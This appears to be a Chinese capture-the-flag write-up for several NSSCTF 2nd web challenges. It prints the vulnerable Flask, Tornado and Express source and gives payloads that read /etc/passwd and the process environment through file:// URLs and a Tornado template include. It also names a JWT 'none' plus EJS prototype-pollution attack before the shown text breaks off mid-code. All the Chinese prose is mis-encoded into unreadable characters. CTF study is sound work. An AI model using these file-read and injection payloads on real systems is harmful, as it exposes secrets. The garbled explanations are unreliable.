href="http://node5.anna.nssctf.cn:28756/?url=dosth">http://node5.anna.nssctf.cn:28756/?url=dosth</a><br>Ëøô‰∏™ÂΩ¢ÂºèÊàë‰ª¨ÂèØËÉΩÊÉ≥Âà∞LFIÊºèÊ¥ûÔºåÁªèËøáÊµãËØïÂèëÁé∞file:&#x2F;&#x2F;ÂèØ‰ª•<br><a href="http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwd%E5%8F%AF%E4%BB%A5%E8%AF%BB%E5%8F%96">http://node5.anna.nssctf.cn:28756/?url=file:///etc/passwdÂèØ‰ª•ËØªÂèñ</a><br><img src="https://img-blog.csdnimg.cn/1fb22c00512948079f0e1969a2b48236.png" alt="2"><br>ËØªÂèñÂà∞Ê∫êÁ†Å<code>app/app.py</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> redirect<span class="token keyword">import</span> requests<span class="token punctuation">,</span> socket<span class="token punctuation">,</span> struct<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parseapp <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token keyword">not</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> redirect<span class="token punctuation">(</span><span class="token string">'/?url=dosth'</span><span class="token punctuation">)</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'url'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'file://'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>url<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            <span class="token keyword">return</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'http://localhost/'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text    <span class="token keyword">elif</span> url<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'mybox://127.0.0.1:'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        port<span class="token punctuation">,</span> content <span class="token operator">=</span> url<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'/_'</span><span class="token punctuation">,</span> maxsplit<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token builtin">int</span><span class="token punctuation">(</span>port<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>parse<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        res <span class="token operator">=</span> <span class="token string">b''</span>        <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>            data <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> data<span class="token punctuation">:</span>                res <span class="token operator">+=</span> data            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">return</span> res    <span class="token keyword">return</span> <span class="token string">''</span>app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> <span class="token number">827</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>‰∏çÁúã‰∏äÈù¢‰ª£Á†ÅÁöÑÊÉÖÂÜµ‰∏ãËøôÈ¢òËøòÊúâ‰∏Ä‰∏™ÈùûÈ¢ÑÊúüËß£Â∞±ÊòØÁõ¥Êé•ËØªÂèñÁéØÂ¢ÉÂèòÈáè<br><code>view-source:http://node5.anna.nssctf.cn:28756/?url=file:///proc/1/environ</code><br><img src="https://img-blog.csdnimg.cn/67f10ba64ae2427f86015bf9692890c1.png" alt="3"></p><h3 id="NSSCTF-2nd-MyHurricane"><a href="#NSSCTF-2nd-MyHurricane" class="headerlink" title="[NSSCTF 2nd]MyHurricane"></a>[NSSCTF 2nd]MyHurricane</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tornado<span class="token punctuation">.</span>ioloop<span class="token keyword">import</span> tornado<span class="token punctuation">.</span>web<span class="token keyword">import</span> osBASE_DIR <span class="token operator">=</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>dirname<span class="token punctuation">(</span>__file__<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">waf</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>    bl <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">,</span> <span class="token string">')'</span><span class="token punctuation">,</span> <span class="token string">'or'</span><span class="token punctuation">,</span> <span class="token string">'and'</span><span class="token punctuation">,</span> <span class="token string">'not'</span><span class="token punctuation">,</span> <span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> c <span class="token keyword">in</span> bl<span class="token punctuation">:</span>        <span class="token keyword">if</span> c <span class="token keyword">in</span> data<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> chunk <span class="token keyword">in</span> data<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> c <span class="token keyword">in</span> chunk<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span><span class="token number">31</span> <span class="token operator">&lt;</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> <span class="token boolean">False</span>    <span class="token keyword">return</span> <span class="token boolean">True</span><span class="token keyword">class</span> <span class="token class-name">IndexHandler</span><span class="token punctuation">(</span>tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>RequestHandler<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_argument<span class="token punctuation">(</span><span class="token string">"ssti"</span><span class="token punctuation">)</span><span class="token comment">#POST‰º†ÂÖ•ssti</span>        <span class="token keyword">if</span> waf<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>                f<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"""&lt;html>                        &lt;head>&lt;/head>                        &lt;body style="font-size: 30px;"></span><span class="token interpolation"><span class="token punctuation">&#123;</span>data<span class="token punctuation">&#125;</span></span><span class="token string">&lt;/body>&lt;/html>                        """</span></span><span class="token punctuation">)</span>                f<span class="token punctuation">.</span>flush<span class="token punctuation">(</span><span class="token punctuation">)</span>            self<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token string">'1.html'</span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            self<span class="token punctuation">.</span>finish<span class="token punctuation">(</span><span class="token string">'no no no'</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app <span class="token operator">=</span> tornado<span class="token punctuation">.</span>web<span class="token punctuation">.</span>Application<span class="token punctuation">(</span><span class="token punctuation">[</span>            <span class="token punctuation">(</span><span class="token string">r"/"</span><span class="token punctuation">,</span> IndexHandler<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">,</span> compiled_template_cache<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>    app<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">827</span><span class="token punctuation">)</span>    tornado<span class="token punctuation">.</span>ioloop<span class="token punctuation">.</span>IOLoop<span class="token punctuation">.</span>current<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ÁúãÂá∫ÊòØ<strong>tornado</strong>Ê®°ÊùøÊ≥®ÂÖ•<br>ÈùûÈ¢ÑÊúüËØªÂèñÁéØÂ¢ÉÂèòÈáè<code>&#123;% include /proc/1/environ %&#125;</code>.<br><img src="https://img-blog.csdnimg.cn/a093653f8c384dafaf5510233312477b.png" alt="4"></p><h3 id="NSSCTF-2nd-MyJs"><a href="#NSSCTF-2nd-MyJs" class="headerlink" title="[NSSCTF 2nd]MyJs"></a>[NSSCTF 2nd]MyJs</h3><blockquote><p>ËÄÉÁÇπÔºöjwtÁ©∫ÁÆóÊ≥ïÊîªÂáª+ejsÂéüÂûãÈìæÊ±°Êüì</p></blockquote><p>ËøôÈ¢òÂ§çÁé∞Êêû‰∫ÜÂçäÂ§©„ÄÇ„ÄÇ„ÄÇ</p><p>ÊâìÂºÄÁΩëÁ´ôÔºåÊü•ÁúãÊ∫ê‰ª£Á†Å<code>/source</code>„ÄÇ</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> express <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> bodyParser <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'body-parser'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> lodash <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'lodash'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> session <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'express-session'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> randomize <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'randomatic'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> jwt <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'jsonwebtoken'</span><span class="token punctuation">)</span><span class="token keyword">const</span> crypto <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'crypto'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> fs <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'fs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>global<span class="token punctuation">.</span>secrets <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">express</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">urlencoded</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">extended</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span>bodyParser<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token string">'/static'</span><span class="token punctuation">,</span> express<span class="token punctuation">.</span><span class="token function">static</span><span class="token punctuation">(</span><span class="token string">'static'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'views'</span><span class="token punctuation">,</span> <span class="token string">'./views'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'view engine'</span><span class="token punctuation">,</span> <span class="token string">'ejs'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">use</span><span class="token punctuation">(</span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">name</span><span class="token operator">:</span> <span class="token string">'session'</span><span class="token punctuation">,</span>    <span class="token literal-property property">secret</span><span class="token operator">:</span> <span class="token function">randomize</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token literal-property property">resave</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    <span class="token literal-property property">saveUninitialized</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'/source'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span><span class="token string">'Content-Type'</span><span class="token punctuation">,</span> <span class="token string">'text/javascript;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span>__filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">,</span> token<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">const</span> sid <span class="token operator">=</span> <span class="token constant">JSON</span><span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token function">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sid <span class="token operator">===</span> <span class="token keyword">undefined</span> <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>                <span class="token literal-property property">username</span><span class="token operator">:</span> username<span class="token punctuation">,</span>                <span class="token literal-property property">count</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token punctuation">&#125;</span>            res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'login.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'login error.'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/register'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> <span class="token punctuation">&#123;</span>username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> username <span class="token operator">==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Username existed."</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">&#125;</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">algorithm</span><span class="token operator">:</span> <span class="token string">"HS256"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'register.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">"Token: "</span> <span class="token operator">+</span> token<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">all</span><span class="token punctuation">(</span><span class="token string">'/home'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>        <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>        <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>        <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token keyword">null</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">post</span><span class="token punctuation">(</span><span class="token string">'/update'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">redirect</span><span class="token punctuation">(</span><span class="token string">'/login'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'nss'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'home.ejs'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>            <span class="token literal-property property">username</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>username<span class="token operator">||</span><span class="token string">'NSS'</span><span class="token punctuation">,</span>            <span class="token literal-property property">count</span><span class="token operator">:</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data<span class="token punctuation">.</span>count<span class="token operator">||</span><span class="token string">'0'</span><span class="token punctuation">,</span>            <span class="token literal-property property">msg</span><span class="token operator">:</span> <span class="token string">'U cant change uid'</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">let</span> data <span class="token operator">=</span> req<span class="token punctuation">.</span>session<span class="token punctuation">.</span>data <span class="token operator">||</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token 